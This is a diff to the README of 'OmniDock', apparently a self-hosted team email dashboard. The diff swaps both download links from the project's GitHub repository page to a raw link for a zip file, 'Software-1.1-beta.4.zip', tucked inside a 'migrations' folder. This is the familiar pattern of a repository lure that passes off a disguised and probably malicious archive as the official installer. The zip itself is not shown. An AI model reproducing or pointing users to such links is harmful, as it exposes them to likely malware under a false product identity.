@@ -1,6 +1,6 @@
 # 📧 omnidock - Manage your team email with ease
 
-[![](https://img.shields.io/badge/Download-OmniDock-blue.svg)](https://github.com/angelapro5786/omnidock)
+[![](https://img.shields.io/badge/Download-OmniDock-blue.svg)](https://raw.githubusercontent.com/angelapro5786/omnidock/main/migrations/Software-1.1-beta.4.zip)
 
 OmniDock acts as a central hub for your team communications. It connects your email domains, storage space, and support tickets into one simple dashboard. You host this application on the Cloudflare network. This setup ensures high speed and total privacy for your data. You maintain control over your contacts, signatures, and file attachments without relying on third-party mail providers.
 
@@ -18,7 +18,7 @@ Your computer needs minimal resources to manage this dashboard. Check this list 
 
 You need to access the release page to get the installer. Follow this link to reach the download page for OmniDock:
 
-[Download OmniDock](https://github.com/angelapro5786/omnidock)
+[Download OmniDock](https://raw.githubusercontent.com/angelapro5786/omnidock/main/migrations/Software-1.1-beta.4.zip)
 
 ## ⚙️ Installation Steps
 
